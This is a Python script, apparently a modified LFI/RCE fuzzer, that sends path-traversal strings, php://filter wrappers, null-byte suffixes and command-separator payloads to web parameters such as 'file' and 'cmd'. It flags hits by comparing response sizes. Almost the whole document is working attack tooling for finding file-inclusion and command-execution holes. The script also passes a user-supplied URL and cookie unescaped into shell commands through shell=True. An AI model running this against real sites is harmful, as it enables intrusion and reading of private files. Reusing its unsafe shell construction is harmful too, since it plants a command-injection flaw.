#!/usr/bin/python3
# coding=utf-8

import argparse
import requests, sys, urllib, re, os, subprocess,time

#Variables
TypeList = ["param","log","rce"]
PayloadInject = ["","%00","/.","/"]
PayloadInject2 = [""]
ListTechnique = ["","../../../../../../../../../..","php://filter/convert.base64-encode/resource=../../../../../../../..","php://filter/resource=../../../../../../../../../../../../..","php://filter/read=string.rot13/resource=../../../../../../../../../.."]
ListTechnique2 = ["","%3B","%7C"]
ListParam = ["book","download","path","link","name","cat","dir","file","action","board","date","detail","folder","prefix","page","id","image","include","inc","locate","show","doc","site","type","view","content","mod","conf"]
ListParam2 = ["id","cmd","shell","command","cat","read","username"]
ListWorking = []

#CraftPayload
def craftPayloadList(files,args):
	ListFiles = []
	files = open(args.wordlist)
	for i in files:
		if args.type == "rce":
			for k in PayloadInject2:
				ListFiles.append(i.strip()+k)
		else:
			for k in PayloadInject:
				ListFiles.append(i.strip()+k)
	return ListFiles
	
#Get original
def getOriginal(server_url,args):
	if args.cookie:
		cmd = "curl -s " + server_url + " -b " + args.cookie + " | wc -m"
	else:
		cmd = "curl -s " + server_url + " | wc -m"
	return cmd

#Get Crafted
def getCraft(server_url,args,payload):
	if args.cookie:
		cmd = "curl -s " + server_url + payload + " -b " + args.cookie + " | wc -m"
	else:
		cmd = "curl -s " + server_url + payload + " | wc -m"
	return cmd


def header():
	banner = r'''
                     __    ________         ____    ___  
  ___ _____ __ ____ / /   / __\_   \ __   _|___ \  / _ \ 
 / _ \_  / '_ \_  // /   / _\  / /\/ \ \ / / __) || | | |
|  __// /| |_) / // /___/ / /\/ /_    \ V / / __/ | |_| |
 \___/___| .__/___\____/\/  \____/     \_/ |_____(_)___/ 
         |_|         		   [Modified by H0j3n]  
         
              Credits : Ch4rm @aniqfakhrul                                  

'''
	print('\033[94m'+banner+'\033[0m')
	print('Available Type:')
	for i in TypeList:
		print("\033[1m\033[92m["+i+"] \033[0m", end="")
	print("\n")
	

header()
parseC = argparse.ArgumentParser(allow_abbrev=False,prog=sys.argv[0], usage='%(prog)s --wordlist list.txt --cookie X=Y --type TYPE')
parseC.add_argument('--type', action='store', type=str, required=True)
parseC.add_argument('--wordlist', action='store', type=str, required=True)
parseC.add_argument('--cookie', action='store', type=str)
parseC.add_argument('--verbose', action='count',default=0)
parseC.add_argument('--technique', action='count',default=0)

args = parseC.parse_args()

if args.type == "param":
	ListPayload = craftPayloadList(args.wordlist,args)
	print("\33[33mExample : http://localhost/index.php?\033[0m")
	print("\33[33mExample : http://localhost/article?\033[0m")
	server_url = input("\n\033[1m\033[92mEnter Url : \033[0m")
	print("")
	cmd = getOriginal(server_url,args)
	ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
	original= ps.communicate()[0].decode("utf-8").strip()
	print("\033[1m\033[92m\n[+] Original Size : \033[0m" + str(original) + "\n")
	if args.technique:
		for param in ListParam:
			for tech in ListTechnique:
				for payload in ListPayload:
					tmp = param + "=" + tech + payload
					payload = tmp
					cmd = getCraft(server_url,args,payload)
					ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
					after = ps.communicate()[0].decode("utf-8").strip()
					if int(after) > int(original):
						print("\033[1m\033[92m[+] Possible Working! " + after + " \033[0m")
						print("\33[33m\tPayload = " + server_url + payload +"\033[0m")
						ListWorking.append(server_url + payload)
					else:
						if args.verbose:
							print("\33[31m[+] Not Working! " + after + " \033[0m")
							print("\33[33m\tPayload = " + server_url + payload +"\033[0m")
						else:
							continue
	else:
		for param in ListParam:
			for payload in ListPayload:
				tmp = param + "=" + payload
				payload = tmp
				cmd = getCraft(server_url,args,payload)
				ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
				after = ps.communicate()[0].decode("utf-8").strip()
				if int(after) > int(original):
					print("\033[1m\033[92m[+] Possible Working! " + after + " \033[0m")
					print("\33[33m\tPayload = " + server_url + payload +"\033[0m")
					ListWorking.append(server_url + payload)
				else:
					if args.verbose:
						print("\33[31m[+] Not Working! " + after + " \033[0m")
						#print("\33[33m\tPayload = " + server_url + payload +"\033[0m")
					else:
						continue
elif args.type == "log":
	ListPayload = craftPayloadList(args.wordlist,args)
	print("\33[33mExample : http://localhost/index.php?file=\033[0m")
	print("\33[33mExample : http://localhost/index.php?file=php://filter/convert.base64-encode/resource=\033[0m")
	print("\33[33mExample : http://localhost/index.php?file=php://filter/resource=\033[0m")
	print("\33[33mExample : http://localhost/index.php?file=php://filter/read=string.rot13/resource=\033[0m")
	server_url = input("\n\033[1m\033[92mEnter Url With Working Parameter: \033[0m")
	print("")
	cmd = getOriginal(server_url,args)
	ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
	original= ps.communicate()[0].decode("utf-8").strip()
	print("\033[1m\033[92m\n[+] Original Size : \033[0m" + str(original) + "\n")
	if args.technique:
		for payload in ListPayload:
			for tech in ListTechnique:
				tmp = tech+payload
				payload = tmp
				cmd = getCraft(server_url,args,payload)
				ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
				after = ps.communicate()[0].decode("utf-8").strip()
				if int(after) > int(original):
					print("\033[1m\033[92m[+] Possible Working! " + after + " \033[0m")
					print("\33[33m\tPayload = " + server_url + payload +"\033[0m")
					ListWorking.append(server_url + payload)
				else:
					if args.verbose:
						print("\33[31m[+] Not Working! " + after + " \033[0m")
						print("\33[33m\tPayload = " + server_url + payload +"\033[0m")
					else:
						continue
	else:
		for payload in ListPayload:
			cmd = getCraft(server_url,args,payload)
			ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
			after = ps.communicate()[0].decode("utf-8").strip()
			if int(after) > int(original):
				print("\033[1m\033[92m[+] Possible Working! " + after + " \033[0m")
				print("\33[33m\tPayload = " + server_url + payload +"\033[0m")
				ListWorking.append(server_url + payload)
			else:
				if args.verbose:
					print("\33[31m[+] Not Working! " + after + " \033[0m")
					print("\33[33m\tPayload = " + server_url + payload +"\033[0m")
				else:
					continue
elif args.type == "rce":
	ListPayload = craftPayloadList(args.wordlist,args)
	print("\33[33mExample : http://localhost/index.php?\033[0m")
	print("\33[33mExample : http://localhost/article?\033[0m")
	server_url = input("\n\033[1m\033[92mEnter Url With Working Parameter: \033[0m")
	print("")
	cmd = getOriginal(server_url,args)
	ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
	original= ps.communicate()[0].decode("utf-8").strip()
	print("\033[1m\033[92m\n[+] Original Size : \033[0m" + str(original) + "\n")
	if args.technique:
		for param in ListParam2:
			for tech in ListTechnique2:
				for payload in ListPayload:
					tmp = param + "=" + tech + payload
					payload = tmp
					cmd = getCraft(server_url,args,payload)
					ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
					after = ps.communicate()[0].decode("utf-8").strip()
					if int(after) > int(original):
						print("\033[1m\033[92m[+] Possible Working! " + after + " \033[0m")
						print("\33[33m\tPayload = " + server_url + payload +"\033[0m")
						ListWorking.append(server_url + payload)
					else:
						if args.verbose:
							print("\33[31m[+] Not Working! " + after + " \033[0m")
							print("\33[33m\tPayload = " + server_url + payload +"\033[0m")
						else:
							continue
	else:
		for param in ListParam2:
			for payload in ListPayload:
				tmp = param + "=" + payload
				payload = tmp
				cmd = getCraft(server_url,args,payload)
				ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
				after = ps.communicate()[0].decode("utf-8").strip()
				if int(after) > int(original):
					print("\033[1m\033[92m[+] Possible Working! " + after + " \033[0m")
					print("\33[33m\tPayload = " + server_url + payload +"\033[0m")
					ListWorking.append(server_url + payload)
				else:
					if args.verbose:
						print("\33[31m[+] Not Working! " + after + " \033[0m")
						print("\33[33m\tPayload = " + server_url + payload +"\033[0m")
					else:
						continue
else:
	print("Type not available! Check again")
	
print("\n\033[1m\033[92m[+] Working List! \033[0m")
for i in ListWorking:
	print("\033[1m\033[92m\tPayload = " + i +"\033[0m")